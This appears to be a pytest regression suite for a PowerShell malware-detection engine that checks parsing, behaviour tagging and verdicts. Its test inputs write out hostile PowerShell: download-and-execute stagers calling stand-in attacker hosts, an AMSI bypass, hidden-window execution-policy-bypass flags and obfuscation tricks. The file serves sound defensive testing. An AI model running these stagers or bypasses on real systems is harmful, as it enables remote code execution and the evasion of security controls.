"""Phase 9.4 · PowerShell Semantic Intelligence — regression suite.

Verifies the AST engine, behavior extractor, decode timeline, and
explainable verdict against a NivXRay-native adversarial corpus.
"""
from __future__ import annotations

import base64
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from v2.semantic.ps_ast import parse as ast_parse                     # noqa: E402
from v2.semantic.ps_behaviors import (                                 # noqa: E402
    extract_behaviors, build_evidence_graph,
)
from v2.semantic.ps_semantic import analyze                            # noqa: E402


def _enc(ps: str, flags: str = "-nop -w hidden -ep bypass") -> str:
    return (f"powershell.exe {flags} -EncodedCommand "
            f"{base64.b64encode(ps.encode('utf-16-le')).decode()}")


# ── AST tokenizer / parser ───────────────────────────────────────
def test_ast_parses_simple_pipeline() -> None:
    src = "Get-Process | Where-Object { $_.Name -eq 'notepad' } | Stop-Process"
    s = ast_parse(src)
    assert s.statements, "no statements parsed"
    # First statement should be a Pipeline node with 3 stages
    root = s.statements[0]
    assert root.kind in ("Pipeline", "Call"), root.kind


def test_ast_variable_constant_folding() -> None:
    src = "$u = 'http://evil.example.com/x.ps1'"
    s = ast_parse(src)
    assert s.variables.get("u") == "http://evil.example.com/x.ps1"


def test_ast_format_string_reconstruction() -> None:
    src = "$w = ('{0}{1}{2}' -f 'I','E','X')"
    s = ast_parse(src)
    assert s.variables.get("w") == "IEX", f"expected 'IEX', got {s.variables.get('w')!r}"


def test_ast_join_reconstruction() -> None:
    src = "$c = ('D','o','w','n','l','o','a','d','S','t','r','i','n','g') -join ''"
    s = ast_parse(src)
    assert s.variables.get("c") == "DownloadString", (
        f"expected 'DownloadString', got {s.variables.get('c')!r}")


# ── Behavior extractor ───────────────────────────────────────────
def test_behavior_iex_downloadstring_chain() -> None:
    src = "IEX (New-Object System.Net.WebClient).DownloadString('http://evil.example.com/x.ps1')"
    s = ast_parse(src)
    bs = extract_behaviors(s)
    ids = {b.id for b in bs}
    assert "invoke_expression" in ids
    assert "webclient_downloadstring" in ids
    assert "memory_execution" in ids
    assert "external_network" in ids
    assert "c2_communication" in ids, f"C2 correlation not fired: {ids}"


def test_behavior_scheduled_task_persistence() -> None:
    src = "Register-ScheduledTask -TaskName 'Updater' -Action $act"
    s = ast_parse(src)
    ids = {b.id for b in extract_behaviors(s)}
    assert "scheduled_task" in ids
    assert "persistence" in ids


def test_behavior_amsi_text_signal() -> None:
    src = ("[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
           ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)")
    s = ast_parse(src)
    ids = {b.id for b in extract_behaviors(s)}
    assert "amsi_bypass" in ids, f"AMSI text signal missed: {ids}"


def test_behavior_execution_policy_bypass_flag() -> None:
    src = "powershell.exe -ExecutionPolicy Bypass -Command 'Get-Process'"
    s = ast_parse(src)
    ids = {b.id for b in extract_behaviors(s)}
    assert "execution_policy_bypass" in ids
    assert "hidden_window" not in ids  # Not present


def test_behavior_frombase64string_static_call() -> None:
    src = "[System.Convert]::FromBase64String('SGVsbG8=')"
    s = ast_parse(src)
    ids = {b.id for b in extract_behaviors(s)}
    assert "payload_decode" in ids


def test_behavior_local_only_when_loopback_no_external() -> None:
    src = "Start-Process 'http://127.0.0.1:4096/'"
    s = ast_parse(src)
    ids = {b.id for b in extract_behaviors(s)}
    assert "local_network_only" in ids
    assert "external_network" not in ids
    assert "c2_communication" not in ids


# ── Evidence graph ───────────────────────────────────────────────
def test_evidence_graph_shape() -> None:
    src = "IEX (New-Object Net.WebClient).DownloadString('http://c2/x')"
    s = ast_parse(src)
    bs = extract_behaviors(s)
    g = build_evidence_graph(s, bs, decoder_layers=[
        {"decoder": "base64_decode", "confidence": 0.95, "in_len": 100, "out_len": 60,
         "why": "encoded blob", "layer": 1}])
    kinds = {n["kind"] for n in g["nodes"]}
    assert kinds >= {"script", "behavior", "decoder_layer", "ioc"}
    assert any(e["kind"] == "witnesses" for e in g["edges"])
    assert any(e["kind"] == "derives_from" for e in g["edges"])


# ── analyze() end-to-end contract ────────────────────────────────
def test_analyze_populates_phase94_fields() -> None:
    r = analyze(_enc("IEX (New-Object Net.WebClient).DownloadString('http://c2.evil.com/p.ps1')"))
    d = r.to_dict()
    assert d["detected"]
    # Legacy fields preserved
    assert "behaviors" in d and "ast" in d and "verdict" in d
    # Phase 9.4 fields present
    for k in ("behaviors_v2", "evidence_graph", "decode_timeline",
              "verdict_breakdown", "ast_tree", "resolved_variables"):
        assert k in d, f"missing Phase 9.4 field {k}"
    assert d["behaviors_v2"], "behaviors_v2 is empty for IEX+DL"
    assert d["decode_timeline"], "decode_timeline is empty"
    assert d["verdict_breakdown"]["verdict"] in {"malicious", "suspicious", "needs_review",
                                                  "informational", "benign"}


def test_analyze_verdict_malicious_for_c2_stager() -> None:
    r = analyze(_enc("IEX (New-Object Net.WebClient).DownloadString('http://evil.example.com/x.ps1')"))
    vb = r.verdict_breakdown
    assert vb["verdict"] == "malicious", (
        f"C2 stager should be malicious; got {vb['verdict']} at risk {vb['risk_score']}")
    assert vb["behavior_score"] >= 70
    top_ids = {s["id"] for s in vb["top_signals"]}
    assert "c2_communication" in top_ids


def test_analyze_decode_timeline_explains_every_step() -> None:
    r = analyze(_enc("Start-Process 'http://127.0.0.1:4096/'"))
    steps = r.decode_timeline
    kinds = {s["decoder"] for s in steps}
    assert "input_scanner" in kinds
    assert "extract_encodedcommand" in kinds
    assert "base64_decode" in kinds
    assert "utf16le_strict" in kinds
    assert "ps_ast_parser" in kinds
    assert "behavior_extractor_v2" in kinds
    # Every step has a reason
    for s in steps:
        assert s["reason"], f"step {s['decoder']} missing reason"
        assert s["status"] in ("applied", "skipped", "failed")


def test_analyze_no_ps_command_returns_empty() -> None:
    r = analyze("cmd.exe /c dir")
    assert not r.detected
    assert not r.behaviors_v2


def test_backward_compat_legacy_fields_untouched() -> None:
    """The legacy `behaviors` array and `verdict` string must still exist
    in the same shape older UI code relies on."""
    r = analyze(_enc("IEX (New-Object Net.WebClient).DownloadString('http://c2.x/p')"))
    assert isinstance(r.behaviors, list)
    for b in r.behaviors:
        assert "category" in b and "weight" in b and "mitre" in b


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
